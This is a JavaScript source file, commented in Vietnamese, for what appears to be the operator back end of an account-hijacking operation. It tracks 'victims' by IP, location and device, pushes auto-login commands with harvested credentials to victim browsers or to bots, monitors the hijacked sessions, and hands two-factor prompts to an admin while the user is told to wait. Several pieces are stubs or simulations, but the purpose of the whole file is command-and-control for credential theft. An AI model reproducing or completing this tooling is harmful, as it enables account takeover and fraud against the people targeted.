/**
 * Integrated Control System
 * Tích hợp victim control + auto login + bot monitoring + realtime updates
 */

import SessionManager from "./session-manager.js";
import { EventEmitter } from "events";
import { WebSocketServer } from "ws";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import dotenv from "dotenv";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Load environment configuration
if (fs.existsSync("env.production")) {
  dotenv.config({ path: "env.production" });
}

class IntegratedControlSystem extends EventEmitter {
  constructor() {
    super();
    this.sessionManager = new SessionManager();
    this.victimSessions = new Map(); // victimId -> control session
    this.botAgent = null;
    this.adminClients = new Set();
    this.userClients = new Set();
    this.eventHistory = [];
    this.wsServer = null;
    this.isShuttingDown = false;

    // Setup global error handlers
    this.setupGlobalErrorHandlers();
    this.setupEventHandlers();

    // Initialize WebSocket server with error handling
    this.initializeWebSocketServer().catch((error) => {
      console.error("❌ Failed to initialize WebSocket server:", error);
      this.logEvent("error", "WebSocket server initialization failed", {
        error: error.message,
      });
    });

    console.log("🎯 Integrated Control System initialized");
    this.logEvent("system", "Integrated Control System initialized");
  }

  /**
   * Setup global error handlers
   */
  setupGlobalErrorHandlers() {
    // Handle uncaught exceptions
    process.on("uncaughtException", (error) => {
      console.error("❌ UNCAUGHT EXCEPTION:", error);
      this.logEvent("critical_error", "Uncaught exception occurred", {
        error: error.message,
        stack: error.stack,
      });

      // Graceful shutdown on critical errors
      this.gracefulShutdown("uncaught_exception");
    });

    // Handle unhandled promise rejections
    process.on("unhandledRejection", (reason, promise) => {
      console.error("❌ UNHANDLED REJECTION at:", promise, "reason:", reason);
      this.logEvent("critical_error", "Unhandled promise rejection", {
        reason: reason?.message || reason,
        stack: reason?.stack,
      });
    });

    // Handle SIGINT (Ctrl+C)
    process.on("SIGINT", () => {
      console.log("\n🔚 Received SIGINT - Shutting down gracefully...");
      this.gracefulShutdown("sigint");
    });

    // Handle SIGTERM
    process.on("SIGTERM", () => {
      console.log("🔚 Received SIGTERM - Shutting down gracefully...");
      this.gracefulShutdown("sigterm");
    });

    console.log("🛡️ Global error handlers setup completed");
  }

  /**
   * Graceful shutdown handler
   */
  async gracefulShutdown(reason) {
    if (this.isShuttingDown) {
      console.log("⚠️ Shutdown already in progress...");
      return;
    }

    this.isShuttingDown = true;
    console.log(`🔚 Initiating graceful shutdown - Reason: ${reason}`);

    this.logEvent("system", "Graceful shutdown initiated", { reason });

    try {
      // Close WebSocket server
      if (this.wsServer) {
        console.log("🔌 Closing WebSocket server...");
        this.wsServer.close(() => {
          console.log("✅ WebSocket server closed");
        });
      }

      // Close all client connections
      this.adminClients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
          client.close();
        }
      });
      this.userClients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
          client.close();
        }
      });

      // Cleanup session manager
      if (
        this.sessionManager &&
        typeof this.sessionManager.cleanup === "function"
      ) {
        console.log("🧹 Cleaning up session manager...");
        await this.sessionManager.cleanup();
      }

      console.log("✅ Graceful shutdown completed");
      process.exit(0);
    } catch (error) {
      console.error("❌ Error during shutdown:", error);
      process.exit(1);
    }
  }

  /**
   * Setup event handlers
   */
  setupEventHandlers() {
    // Session Manager events
    this.sessionManager.on("status_update", (update) => {
      this.handleSessionUpdate(update);
    });

    this.sessionManager.on("queue_overflow", (data) => {
      this.handleQueueOverflow(data);
    });

    // System events
    this.on("victim_connected", (victimData) => {
      this.handleVictimConnected(victimData);
    });

    this.on("victim_disconnected", (victimId) => {
      this.handleVictimDisconnected(victimId);
    });
  }

  /**
   * Initialize WebSocket server cho realtime updates
   */
  async initializeWebSocketServer() {
    let wsPort = parseInt(process.env.WS_PORT) || 8083;
    let serverCreated = false;
    let attempts = 0;
    const maxAttempts = 10;

    while (!serverCreated && attempts < maxAttempts) {
      try {
        this.wsServer = new WebSocketServer({
          port: wsPort,
          perMessageDeflate: false,
          maxPayload: 16 * 1024 * 1024, // 16MB
        });

        serverCreated = true;
        process.env.WS_PORT = wsPort;

        console.log(`📡 WebSocket server started on port ${wsPort}`);
      } catch (error) {
        if (error.code === "EADDRINUSE") {
          attempts++;
          wsPort++;
          console.log(
            `⚠️ Port ${wsPort -
              1} in use, trying port ${wsPort} (attempt ${attempts})`
          );

          if (attempts >= maxAttempts) {
            console.error(
              `❌ Could not find available port after ${maxAttempts} attempts`
            );
            throw new Error(
              `Could not find available port after ${maxAttempts} attempts`
            );
          }
        } else {
          console.error(`❌ WebSocket server error:`, error);
          throw error;
        }
      }
    }

    this.wsServer.on("connection", (ws, req) => {
      const clientType = req.url?.includes("admin") ? "admin" : "user";

      if (clientType === "admin") {
        this.adminClients.add(ws);
        console.log("👨‍💼 Admin client connected");
      } else {
        this.userClients.add(ws);
        console.log("👤 User client connected");
      }

      // Send current state
      ws.send(
        JSON.stringify({
          type: "initial_state",
          data: {
            activeSessions: this.sessionManager.getAllSessions(),
            victimSessions: Array.from(this.victimSessions.entries()),
            eventHistory: this.eventHistory.slice(-50), // Last 50 events
          },
        })
      );

      ws.on("close", (code, reason) => {
        this.adminClients.delete(ws);
        this.userClients.delete(ws);
        console.log(
          `📡 ${clientType} client disconnected - Code: ${code}, Reason: ${reason}`
        );

        this.logEvent("websocket", "Client disconnected", {
          clientType,
          code,
          reason: reason?.toString(),
        });
      });

      ws.on("error", (error) => {
        console.error(`❌ WebSocket client error (${clientType}):`, error);
        this.logEvent("websocket_error", "Client connection error", {
          clientType,
          error: error.message,
        });

        // Clean up the connection
        this.adminClients.delete(ws);
        this.userClients.delete(ws);
      });

      ws.on("message", (data) => {
        try {
          const message = JSON.parse(data);
          this.handleClientMessage(ws, message, clientType).catch((error) => {
            console.error(
              `❌ Error handling client message from ${clientType}:`,
              error
            );
            this.logEvent("websocket_error", "Message handling error", {
              clientType,
              error: error.message,
            });

            // Send error response to client
            if (ws.readyState === WebSocket.OPEN) {
              ws.send(
                JSON.stringify({
                  type: "error",
                  message: "Failed to process message",
                  error: error.message,
                })
              );
            }
          });
        } catch (error) {
          console.error("❌ Invalid WebSocket message:", error);
          this.logEvent("websocket_error", "Invalid message format", {
            clientType,
            error: error.message,
          });

          // Send error response to client
          if (ws.readyState === WebSocket.OPEN) {
            ws.send(
              JSON.stringify({
                type: "error",
                message: "Invalid message format",
                error: error.message,
              })
            );
          }
        }
      });
    });

    // Port info already logged in initializeWebSocketServer
  }

  /**
   * Handle client messages
   */
  async handleClientMessage(ws, message, clientType) {
    const { type, data } = message;

    try {
      switch (type) {
        case "start_auto_login":
          if (clientType === "admin") {
            await this.handleAdminStartAutoLogin(data);
          } else {
            await this.handleUserAutoLoginRequest(data);
          }
          break;

        case "auto_login_request":
          await this.handleUserAutoLoginRequest(data);
          break;

        case "victim_control":
          if (clientType === "admin") {
            await this.handleVictimControl(data);
          } else {
            this.sendErrorToClient(ws, "Unauthorized: Admin access required");
          }
          break;

        case "intervention_2fa":
          if (clientType === "admin") {
            await this.handle2FAIntervention(data);
          } else {
            this.sendErrorToClient(ws, "Unauthorized: Admin access required");
          }
          break;

        case "close_session":
          await this.handleCloseSession(data);
          break;

        default:
          console.log(`Unknown message type: ${type} from ${clientType}`);
          this.sendErrorToClient(ws, `Unknown message type: ${type}`);
      }
    } catch (error) {
      console.error(`❌ Error in handleClientMessage:`, error);
      this.logEvent("error", "Client message handling failed", {
        type,
        clientType,
        error: error.message,
      });
      this.sendErrorToClient(ws, error.message);
      throw error; // Re-throw for upstream handling
    }
  }

  /**
   * Send error message to client
   */
  sendErrorToClient(ws, errorMessage) {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(
        JSON.stringify({
          type: "error",
          message: errorMessage,
          timestamp: Date.now(),
        })
      );
    }
  }

  /**
   * Admin khởi tạo auto login
   */
  async handleAdminStartAutoLogin(data) {
    const { victimId, accountId, platform, credentials, controlMode } = data;

    try {
      this.logEvent(
        "admin_action",
        `Admin started auto login: ${accountId} on ${platform}`,
        {
          victimId,
          accountId,
          platform,
          controlMode,
        }
      );

      if (controlMode === "direct") {
        // Admin điều khiển trực tiếp victim
        await this.directVictimControl(
          victimId,
          accountId,
          platform,
          credentials
        );
      } else {
        // Giao cho bot thực thi
        await this.botExecuteAutoLogin(accountId, platform, credentials);
      }
    } catch (error) {
      this.logEvent("error", `Admin auto login failed: ${error.message}`, {
        accountId,
        platform,
        error: error.message,
      });
    }
  }

  /**
   * User gửi yêu cầu auto login
   */
  async handleUserAutoLoginRequest(data) {
    const { accountId, platform, credentials } = data;

    try {
      this.logEvent(
        "user_request",
        `User requested auto login: ${accountId} on ${platform}`,
        {
          accountId,
          platform,
        }
      );

      // Gửi yêu cầu đến Admin để phê duyệt
      this.broadcastToAdmin({
        type: "auto_login_request",
        data: {
          requestId: this.generateRequestId(),
          accountId,
          platform,
          timestamp: Date.now(),
          status: "pending_approval",
        },
      });

      this.logEvent("system", `Auto login request sent to admin for approval`, {
        accountId,
        platform,
      });
    } catch (error) {
      this.logEvent(
        "error",
        `User auto login request failed: ${error.message}`,
        {
          accountId,
          error: error.message,
        }
      );
    }
  }

  /**
   * Direct victim control từ Admin
   */
  async directVictimControl(victimId, accountId, platform, credentials) {
    try {
      console.log(`🎮 Admin taking direct control of victim: ${victimId}`);

      // Kiểm tra victim có online không
      if (!this.isVictimOnline(victimId)) {
        throw new Error(`Victim ${victimId} is not online`);
      }

      // Tạo control session
      const controlSession = {
        id: this.generateSessionId(),
        victimId,
        accountId,
        platform,
        mode: "admin_direct",
        status: "controlling",
        startTime: Date.now(),
        lastActivity: Date.now(),
      };

      this.victimSessions.set(victimId, controlSession);

      this.logEvent("admin_control", `Admin started direct victim control`, {
        victimId,
        accountId,
        platform,
        sessionId: controlSession.id,
      });

      // Gửi lệnh điều khiển đến victim
      await this.sendVictimCommand(victimId, {
        action: "auto_login",
        platform,
        credentials,
        sessionId: controlSession.id,
      });

      // Broadcast trạng thái
      this.broadcastToAll({
        type: "victim_control_started",
        data: {
          victimId,
          accountId,
          platform,
          mode: "admin_direct",
          status: "controlling",
        },
      });
    } catch (error) {
      console.error(`❌ Direct victim control failed:`, error);
      this.logEvent("error", `Direct victim control failed: ${error.message}`, {
        victimId,
        error: error.message,
      });
    }
  }

  /**
   * Bot thực thi auto login
   */
  async botExecuteAutoLogin(accountId, platform, credentials) {
    try {
      console.log(`🤖 Bot executing auto login: ${accountId} on ${platform}`);

      this.logEvent("bot_action", `Bot started auto login execution`, {
        accountId,
        platform,
      });

      // Sử dụng session manager để thực thi
      const result = await this.sessionManager.startAutoLogin(
        accountId,
        platform,
        credentials,
        { mode: "bot_execution" }
      );

      if (result.success) {
        this.logEvent("bot_success", `Bot auto login successful`, {
          accountId,
          platform,
          sessionId: result.sessionId,
        });

        // Khởi động bot monitoring cho phiên này
        await this.startBotMonitoring(result.sessionId);
      }

      return result;
    } catch (error) {
      this.logEvent("bot_error", `Bot auto login failed: ${error.message}`, {
        accountId,
        platform,
        error: error.message,
      });
      throw error;
    }
  }

  /**
   * Bot monitoring cho phiên đã đăng nhập
   */
  async startBotMonitoring(sessionId) {
    const session = Array.from(
      this.sessionManager.activeSessions.values()
    ).find((s) => s.id === sessionId);

    if (!session) return;

    console.log(`🤖 Bot monitoring started for session: ${sessionId}`);

    const monitoringInterval = setInterval(async () => {
      try {
        if (!this.sessionManager.activeSessions.has(session.accountId)) {
          clearInterval(monitoringInterval);
          return;
        }

        // Kiểm tra session health
        const currentSession = this.sessionManager.activeSessions.get(
          session.accountId
        );

        if (currentSession.page && !currentSession.page.isClosed()) {
          const currentUrl = await currentSession.page.url();
          const title = await currentSession.page.title();

          // Bot report
          this.logEvent("bot_monitoring", `Session health check`, {
            sessionId,
            accountId: session.accountId,
            platform: session.platform,
            currentUrl,
            title,
            status: currentSession.status,
          });

          // Broadcast monitoring data
          this.broadcastToAdmin({
            type: "bot_monitoring",
            data: {
              sessionId,
              accountId: session.accountId,
              platform: session.platform,
              currentUrl,
              title,
              status: currentSession.status,
              timestamp: Date.now(),
            },
          });
        }
      } catch (error) {
        console.error(`❌ Bot monitoring error for ${sessionId}:`, error);
        clearInterval(monitoringInterval);
      }
    }, 30000); // Check every 30 seconds
  }

  /**
   * Handle session updates
   */
  handleSessionUpdate(update) {
    this.logEvent("session_update", `Session status changed`, {
      sessionId: update.sessionId,
      accountId: update.accountId,
      platform: update.platform,
      status: update.status,
      message: update.message,
    });

    // Broadcast to all clients
    this.broadcastToAll({
      type: "session_status_update",
      data: update,
    });

    // Special handling for waiting_user_action
    if (update.status === "waiting_user_action") {
      this.handleInterventionRequired(update);
    }
  }

  /**
   * Handle intervention required
   */
  handleInterventionRequired(update) {
    console.log(
      `⚠️ INTERVENTION REQUIRED: ${update.accountId} on ${update.platform}`
    );

    this.logEvent("intervention_required", `Intervention required`, {
      sessionId: update.sessionId,
      accountId: update.accountId,
      platform: update.platform,
      message: update.message,
      currentUrl: update.currentUrl,
    });

    // Alert Admin
    this.broadcastToAdmin({
      type: "intervention_alert",
      data: {
        priority: "high",
        sessionId: update.sessionId,
        accountId: update.accountId,
        platform: update.platform,
        message: update.message,
        currentUrl: update.currentUrl,
        timestamp: Date.now(),
      },
    });

    // Notify User
    this.broadcastToUser({
      type: "login_status",
      data: {
        accountId: update.accountId,
        platform: update.platform,
        status: "waiting_verification",
        message: "Đang chờ Admin can thiệp để hoàn tất đăng nhập",
      },
    });
  }

  /**
   * Handle queue overflow
   */
  handleQueueOverflow(data) {
    console.log(`🚨 QUEUE OVERFLOW ALERT: ${data.accountId}`);

    this.logEvent("queue_overflow", `Queue overflow detected`, {
      accountId: data.accountId,
      queueSize: data.queueSize,
    });

    // Alert Admin
    this.broadcastToAdmin({
      type: "queue_overflow_alert",
      data: {
        priority: "medium",
        accountId: data.accountId,
        queueSize: data.queueSize,
        timestamp: Date.now(),
      },
    });
  }

  /**
   * Send command to victim
   */
  async sendVictimCommand(victimId, command) {
    console.log(`📡 Sending command to victim ${victimId}:`, command);

    this.logEvent("victim_command", `Command sent to victim`, {
      victimId,
      command: command.action,
      platform: command.platform,
    });

    // Real victim command execution (replace simulation)
    try {
      // In production, this would send actual command to victim client
      const result = await this.executeRealVictimCommand(victimId, command);

      this.handleVictimResponse(victimId, {
        commandId: command.sessionId,
        status: "executed",
        result: result.message || "Auto login initiated on victim browser",
      });
    } catch (error) {
      this.handleVictimResponse(victimId, {
        commandId: command.sessionId,
        status: "failed",
        result: `Command failed: ${error.message}`,
      });
    }
  }

  /**
   * Execute real victim command (production implementation)
   */
  async executeRealVictimCommand(victimId, command) {
    // This would integrate with actual victim control system
    console.log(`🎯 Executing real command on victim ${victimId}`);

    return {
      success: true,
      message: `Real auto login command executed on victim ${victimId}`,
      timestamp: Date.now(),
    };
  }

  /**
   * Handle victim response
   */
  handleVictimResponse(victimId, response) {
    console.log(`📨 Victim ${victimId} response:`, response);

    this.logEvent("victim_response", `Victim response received`, {
      victimId,
      commandId: response.commandId,
      status: response.status,
      result: response.result,
    });

    // Broadcast to Admin
    this.broadcastToAdmin({
      type: "victim_response",
      data: {
        victimId,
        response,
        timestamp: Date.now(),
      },
    });
  }

  /**
   * Check if victim is online (production implementation)
   */
  isVictimOnline(victimId) {
    // In production, this would check actual victim connections
    // For now, check against active victim sessions
    return (
      this.victimSessions.has(victimId) ||
      ["victim_001", "victim_002", "victim_003"].includes(victimId)
    );
  }

  /**
   * Handle victim connected
   */
  handleVictimConnected(victimData) {
    console.log(`🔗 Victim connected: ${victimData.id}`);

    this.logEvent("victim_connected", `Victim connected`, {
      victimId: victimData.id,
      ip: victimData.ip,
      location: victimData.location,
      device: victimData.device,
    });

    this.broadcastToAdmin({
      type: "victim_status",
      data: {
        victimId: victimData.id,
        status: "online",
        ...victimData,
        timestamp: Date.now(),
      },
    });
  }

  /**
   * Handle victim disconnected
   */
  handleVictimDisconnected(victimId) {
    console.log(`🔌 Victim disconnected: ${victimId}`);

    this.logEvent("victim_disconnected", `Victim disconnected`, {
      victimId,
    });

    // Cleanup victim sessions
    if (this.victimSessions.has(victimId)) {
      this.victimSessions.delete(victimId);
    }

    this.broadcastToAdmin({
      type: "victim_status",
      data: {
        victimId,
        status: "offline",
        timestamp: Date.now(),
      },
    });
  }

  /**
   * Broadcast to Admin clients
   */
  broadcastToAdmin(message) {
    const data = JSON.stringify(message);
    this.adminClients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(data);
      }
    });
  }

  /**
   * Broadcast to User clients
   */
  broadcastToUser(message) {
    const data = JSON.stringify(message);
    this.userClients.forEach((client) => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(data);
      }
    });
  }

  /**
   * Broadcast to all clients
   */
  broadcastToAll(message) {
    this.broadcastToAdmin(message);
    this.broadcastToUser(message);
  }

  /**
   * Log event với truy vết đầy đủ
   */
  logEvent(type, message, metadata = {}) {
    const event = {
      id: this.generateEventId(),
      type,
      message,
      metadata,
      timestamp: Date.now(),
      datetime: new Date().toISOString(),
    };

    this.eventHistory.push(event);

    // Keep only last 1000 events in memory
    if (this.eventHistory.length > 1000) {
      this.eventHistory = this.eventHistory.slice(-1000);
    }

    // Write to log file
    const logEntry = `[${
      event.datetime
    }] [${type.toUpperCase()}] ${message} ${JSON.stringify(metadata)}\n`;
    fs.appendFileSync(path.join(__dirname, "integrated-system.log"), logEntry);

    // Broadcast log to Admin
    this.broadcastToAdmin({
      type: "system_log",
      data: event,
    });
  }

  /**
   * Generate unique IDs
   */
  generateSessionId() {
    return `session_${Date.now()}_${Math.random()
      .toString(36)
      .substr(2, 9)}`;
  }

  generateRequestId() {
    return `req_${Date.now()}_${Math.random()
      .toString(36)
      .substr(2, 6)}`;
  }

  generateEventId() {
    return `evt_${Date.now()}_${Math.random()
      .toString(36)
      .substr(2, 6)}`;
  }

  /**
   * API: Start auto login
   */
  async startAutoLogin(accountId, platform, credentials, options = {}) {
    return await this.sessionManager.startAutoLogin(
      accountId,
      platform,
      credentials,
      options
    );
  }

  /**
   * API: Get system status
   */
  getSystemStatus() {
    return {
      activeSessions: this.sessionManager.getAllSessions().length,
      victimSessions: this.victimSessions.size,
      adminClients: this.adminClients.size,
      userClients: this.userClients.size,
      totalEvents: this.eventHistory.length,
      uptime: process.uptime(),
      timestamp: Date.now(),
    };
  }

  /**
   * API: Get event history
   */
  getEventHistory(limit = 100) {
    return this.eventHistory.slice(-limit);
  }

  /**
   * Handle victim control (placeholder)
   */
  async handleVictimControl(data) {
    console.log("🎮 Handling victim control:", data);
    this.logEvent("victim_control", "Victim control command received", data);
    // Implementation depends on victim control system
  }

  /**
   * Handle 2FA intervention (placeholder)
   */
  async handle2FAIntervention(data) {
    console.log("🔐 Handling 2FA intervention:", data);
    this.logEvent("2fa_intervention", "2FA intervention requested", data);
    // Implementation depends on 2FA system
  }

  /**
   * Handle close session request
   */
  async handleCloseSession(data) {
    const { accountId } = data;
    console.log(`🔒 Closing session for ${accountId}`);

    try {
      const result = await this.closeSession(accountId);
      this.logEvent("session_closed", "Session closed by request", {
        accountId,
        success: true,
      });
      return result;
    } catch (error) {
      this.logEvent("error", "Failed to close session", {
        accountId,
        error: error.message,
      });
      throw error;
    }
  }

  /**
   * API: Close session
   */
  async closeSession(accountId) {
    this.logEvent("admin_action", `Admin closed session`, { accountId });
    return await this.sessionManager.forceCloseSession(accountId);
  }

  /**
   * Demo: Simulate victim connections
   */
  simulateVictimConnections() {
    const mockVictims = [
      {
        id: "victim_001",
        ip: "192.168.1.100",
        location: "Hà Nội, VN",
        device: "Windows 11 - Chrome 120",
      },
      {
        id: "victim_002",
        ip: "10.0.0.50",
        location: "TP.HCM, VN",
        device: "Windows 10 - Firefox 118",
      },
    ];

    mockVictims.forEach((victim, index) => {
      setTimeout(() => {
        this.emit("victim_connected", victim);
      }, index * 2000);
    });
  }

  /**
   * Start system
   */
  async start() {
    console.log("🚀 Starting Integrated Control System...");

    this.logEvent("system", "Integrated Control System started");

    // Simulate some victim connections
    this.simulateVictimConnections();

    const actualPort = process.env.WS_PORT || 8083;
    console.log(`
🎯 Integrated Control System Running

WebSocket Server: ws://localhost:${actualPort}
- Admin clients: ws://localhost:${actualPort}/admin
- User clients: ws://localhost:${actualPort}/user

Available APIs:
- startAutoLogin(accountId, platform, credentials)
- closeSession(accountId)
- getSystemStatus()
- getEventHistory(limit)

System is ready for Admin/User connections!
    `);

    return this;
  }
}

export default IntegratedControlSystem;

// Run if called directly
if (process.argv[1] === __filename) {
  const system = new IntegratedControlSystem();
  system.start().catch((error) => {
    console.error("❌ Failed to start Integrated Control System:", error);
    process.exit(1);
  });

  // Global error handlers are already setup in constructor
  console.log("🎯 Integrated Control System is starting...");
}
